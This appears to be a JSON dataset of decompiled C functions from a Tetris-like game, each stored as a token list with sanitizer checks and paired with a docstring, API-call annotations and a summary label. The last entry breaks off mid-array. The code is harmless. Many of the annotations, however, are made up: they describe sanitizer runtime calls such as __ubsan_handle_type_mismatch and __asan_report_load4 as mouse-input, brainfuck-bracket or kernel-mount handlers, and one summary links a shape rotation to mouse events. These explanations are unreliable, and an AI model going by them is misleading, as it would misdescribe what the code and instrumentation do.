            "n",
            ",",
            "m",
            ",",
            "x",
            ",",
            "y",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "4",
            "]",
            ")",
            "v7",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "grid",
            ")",
            ")",
            "{",
            "v11",
            "=",
            "p_newShape",
            ";",
            "v12",
            "=",
            "ga",
            "-",
            ">",
            "shape",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22DE20",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ")",
            ";",
            "}",
            "v13",
            "=",
            "ga",
            "-",
            ">",
            "ms",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22DE80",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ")",
            ";",
            "}",
            "copyMatrix",
            "(",
            "ga",
            "-",
            ">",
            "ns",
            ",",
            "v13",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "v12",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "v11",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `__readfsqword` function is likely used to read a quadword (64 bits) from the FS segment register on x86 architecture, primarily for low-level system programming or accessing thread information.",
            "The function `handle` appears to be part of a larger codebase involving mouse input data structures, error code definitions, and explanations of UTF-8 mechanisms, suggesting it may be involved in creating a context for interception of mouse input events and handling error conditions within a software application.",
            "The function \"mismatch\" is likely part of a larger program, possibly a compiler or system utility, and it handles various types of mismatches or errors, such as bracket mismatches in brainfuck code, endianness mismatches, architectural mismatches, and error codes and messages for system calls.",
            "The `report_load` function is used to generate reports or handle actions related to loading operations, such as reporting prohibited mount paths with symlinks or handling access violations in a kernel module.",
            "The `_bound_not_positive` function is likely part of a system for handling various runtime errors, such as pointer overflow, shift out of bounds, subtraction overflow, type mismatch, and non-positive variable-length array (VLA) bounds, among others, possibly for diagnostic purposes or to trigger aborts in case of critical errors."
        ],
        "longer_label": "The provided code appears to be a function implementing a rotation operation for a game grid, likely involving a Tetris-like game, with annotations indicating low-level system programming involving accessing thread information, handling mouse input events, and managing error conditions within a software application."
    },
    {
        "id": 217,
        "docstring_tokens": [
            "This",
            "code",
            "rotates",
            "the",
            "shape",
            "down",
            "in",
            "a",
            "game",
            "grid",
            "if",
            "there",
            "is",
            "no",
            "collision",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "game_0",
            "*",
            "g",
            ")",
            "{",
            "int",
            "ms",
            ";",
            "int",
            "ns",
            ";",
            "void",
            "*",
            "v3",
            ";",
            "cell",
            "(",
            "*",
            "shape",
            ")",
            "[",
            "4",
            "]",
            ";",
            "int",
            "v5",
            ";",
            "cell",
            "(",
            "*",
            "grid",
            ")",
            "[",
            "10",
            "]",
            ";",
            "cell_0",
            "(",
            "*",
            "v7",
            ")",
            "[",
            "]",
            "[",
            "]",
            ";",
            "int",
            "y",
            ";",
            "int",
            "x",
            ";",
            "int",
            "m",
            ";",
            "cell_0",
            "(",
            "*",
            "v11",
            ")",
            "[",
            "]",
            "[",
            "]",
            ";",
            "cell",
            "(",
            "*",
            "v12",
            ")",
            "[",
            "4",
            "]",
            ";",
            "int",
            "v13",
            ";",
            "__int64",
            "v14",
            "[",
            "9",
            "]",
            ";",
            "game_0",
            "*",
            "ga",
            ";",
            "__int64",
            "v16",
            ";",
            "__int64",
            "v17",
            ";",
            "cell_0",
            "(",
            "*",
            "p_newShape",
            ")",
            "[",
            "]",
            "[",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v19",
            ";",
            "ga",
            "=",
            "g",
            ";",
            "v19",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v14",
            "[",
            "8",
            "]",
            "=",
            "(",
            "__int64",
            ")",
            "v14",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22DFE0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ")",
            ";",
            "}",
            "ms",
            "=",
            "ga",
            "-",
            ">",
            "ms",
            ";",
            "if",
            "(",
            "ms",
            "<",
            "=",
            "0",
            ")",
            "__ubsan_handle_vla_bound_not_positive",
            "(",
            "&",
            "off_22DF60",
            ",",
            "ms",
            ")",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E040",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ")",
            ";",
            "}",
            "ns",
            "=",
            "ga",
            "-",
            ">",
            "ns",
            ";",
            "if",
            "(",
            "ns",
            "<",
            "=",
            "0",
            ")",
            "__ubsan_handle_vla_bound_not_positive",
            "(",
            "&",
            "off_22DFA0",
            ",",
            "ns",
            ")",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "ms",
            ",",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22E3A0",
            ",",
            "ms",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "v16",
            "=",
            "ms",
            "-",
            "1L",
            "L",
            ";",
            "v14",
            "[",
            "0",
            "]",
            "=",
            "ms",
            ";",
            "v14",
            "[",
            "1",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "__OFSUB__",
            "(",
            "ns",
            ",",
            "1L",
            "L",
            ")",
            ")",
            "__ubsan_handle_sub_overflow",
            "(",
            "&",
            "off_22E3E0",
            ",",
            "ns",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "v17",
            "=",
            "ns",
            "-",
            "1L",
            "L",
            ";",
            "v14",
            "[",
            "6",
            "]",
            "=",
            "ms",
            ";",
            "v14",
            "[",
            "7",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v14",
            "[",
            "4",
            "]",
            "=",
            "ns",
            ";",
            "v14",
            "[",
            "5",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v14",
            "[",
            "2",
            "]",
            "=",
            "ms",
            ";",
            "v14",
            "[",
            "3",
            "]",
            "=",
            "0L",
            "L",
            ";",
            "v3",
            "=",
            "alloca",
            "(",
            "16",
            "*",
            "(",
            "(",
            "16",
            "*",
            "ms",
            "*",
            "(",
            "__int64",
            ")",
            "ns",
            "+",
            "18",
            ")",
            "/",
            "0x10uL",
            "L",
            ")",
            ")",
            ";",
            "p_newShape",
            "=",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            "[",
            "]",
            ")",
            "v14",
            ";",
            "shape",
            "=",
            "ga",
            "-",
            ">",
            "shape",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E0A0",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ")",
            ";",
            "}",
            "v5",
            "=",
            "ga",
            "-",
            ">",
            "ms",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E100",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ")",
            ";",
            "}",
            "copyMatrix",
            "(",
            "ga",
            "-",
            ">",
            "ns",
            ",",
            "v5",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "v14",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "shape",
            ")",
            ";",
            "rotateRight",
            "(",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "4",
            "]",
            ")",
            "p_newShape",
            ")",
            ";",
            "grid",
            "=",
            "ga",
            "-",
            ">",
            "grid",
            ";",
            "v7",
            "=",
            "p_newShape",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E160",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "24",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "y",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "y",
            ")",
            ";",
            "}",
            "y",
            "=",
            "ga",
            "-",
            ">",
            "y",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E1C0",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "20",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "x",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "x",
            ")",
            ";",
            "}",
            "x",
            "=",
            "ga",
            "-",
            ">",
            "x",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E220",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "m",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "m",
            ")",
            ";",
            "}",
            "m",
            "=",
            "ga",
            "-",
            ">",
            "m",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E280",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ga",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "ga",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "ga",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "colision",
            "(",
            "ga",
            "-",
            ">",
            "n",
            ",",
            "m",
            ",",
            "x",
            ",",
            "y",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "4",
            "]",
            ")",
            "v7",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "grid",
            ")",
            ")",
            "{",
            "v11",
            "=",
            "p_newShape",
            ";",
            "v12",
            "=",
            "ga",
            "-",
            ">",
            "shape",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E2E0",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "ms",
            ")",
            ";",
            "}",
            "v13",
            "=",
            "ga",
            "-",
            ">",
            "ms",
            ";",
            "if",
            "(",
            "!",
            "ga",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "ga",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E340",
            ",",
            "ga",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "ga",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "ga",
            "-",
            ">",
            "ns",
            ")",
            ";",
            "}",
            "copyMatrix",
            "(",
            "ga",
            "-",
            ">",
            "ns",
            ",",
            "v13",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "v12",
            ",",
            "(",
            "cell_0",
            "(",
            "*",
            ")",
            "[",
            "]",
            ")",
            "v11",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read a 64-bit unsigned integer value from the FS segment register, typically used in low-level system programming for accessing thread information or other specialized data structures.",
            "The `mismatch` function appears to be a part of a larger program, likely a compiler or a system utility, where it handles cases of mismatched conditions or errors, such as bracket mismatches or system error codes.",
            "The `report_load` function is used to log or report attempts to access memory or load files within a Linux kernel module, with different implementations provided for different contexts such as memory accesses and file loads.",
            "The `bound` function appears to be a part of a larger codebase, possibly related to a virtual machine implementation or regular expression processing, and its purpose seems to involve defining memory and table structures, specifying intrinsic types, and potentially handling repetition specifiers within regular expressions.",
            "The function \"positive\" seems to have been inconsistently defined across the code snippets provided, with one snippet appearing to check if a number is positive or negative, another calculating the absolute difference between two integers, and the last one handling SQL statement preparation errors; thus, its purpose and usage are ambiguous."
        ],
        "longer_label": "The provided code is a function named `rotateDown` that rotates a shape downwards in a game, while also containing annotations describing low-level system functions and error handling mechanisms likely employed in a larger system or compiler utility."
    },
    {
        "id": 218,
        "docstring_tokens": [
            "The",
            "code",
            "appends",
            "the",
            "shape",
            "of",
            "a",
            "game",
            "object",
            "to",
            "the",
            "grid",
            "at",
            "the",
            "position",
            "specified",
            "by",
            "the",
            "game",
            "object",
            "'s",
            "coordinates",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "game_0",
            "*",
            "g",
            ")",
            "{",
            "unsigned",
            "__int64",
            "v1",
            ";",
            "bool",
            "v2",
            ";",
            "int",
            "y",
            ";",
            "int",
            "v4",
            ";",
            "int",
            "x",
            ";",
            "int",
            "v6",
            ";",
            "char",
            "v7",
            ";",
            "bool",
            "v8",
            ";",
            "char",
            "v9",
            ";",
            "char",
            "v10",
            ";",
            "bool",
            "v11",
            ";",
            "char",
            "v12",
            ";",
            "int",
            "*",
            "v13",
            ";",
            "int",
            "*",
            "p_b",
            ";",
            "__int64",
            "v15",
            ";",
            "int",
            "i",
            ";",
            "int",
            "j",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E7E0",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "8",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ns",
            ")",
            ";",
            "}",
            "if",
            "(",
            "i",
            ">",
            "=",
            "g",
            "-",
            ">",
            "ns",
            ")",
            "break",
            ";",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E780",
            ",",
            "g",
            ")",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "char",
            ")",
            "(",
            "(",
            "(",
            "(",
            "_BYTE",
            ")",
            "g",
            "+",
            "12",
            ")",
            "&",
            "7",
            ")",
            "+",
            "3",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load4",
            "(",
            "&",
            "g",
            "-",
            ">",
            "ms",
            ")",
            ";",
            "}",
            "if",
            "(",
            "j",
            ">",
            "=",
            "g",
            "-",
            ">",
            "ms",
            ")",
            "break",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "i",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22E420",
            ",",
            "i",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "__int64",
            ")",
            "j",
            ">",
            "3",
            ")",
            "__ubsan_handle_out_of_bounds",
            "(",
            "&",
            "off_22E460",
            ",",
            "j",
            ")",
            ";",
            "if",
            "(",
            "!",
            "g",
            "|",
            "|",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "&",
            "3",
            ")",
            "!",
            "=",
            "0",
            ")",
            "__ubsan_handle_type_mismatch",
            "(",
            "&",
            "off_22E4A0",
            ",",
            "g",
            ")",
            ";",
            "v1",
            "=",
            "(",
            "unsigned",
            "__int64",
            ")",
            "&",
            "g",
            "-",
            ">",
            "shape",
            "[",
            "i",
            "]",
            "[",
            "j",
            "]",
            ";",
            "if",
            "(",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "(",
            "16",
            "*",
            "(",
            "4",
            "*",
            "i",
            "+",
            "j",
            "-",
            "95",
            ")",
            "+",
            "(",
            "unsigned",
            "__int8",
            ")",
            "g",
            "+",
            "4",
            ")",
            "&",
            "7",
            ")",
            ">",
            "=",
            "*",
            "(",
            "_BYTE",
            "*",
            ")",
            "(",
            "(",
            "v1",
            ">",
            ">",
            "3",
            ")",
            "+",
            "0x7FFF8000",
            ")",
            ")",
            "{",
            "__asan_report_load1",
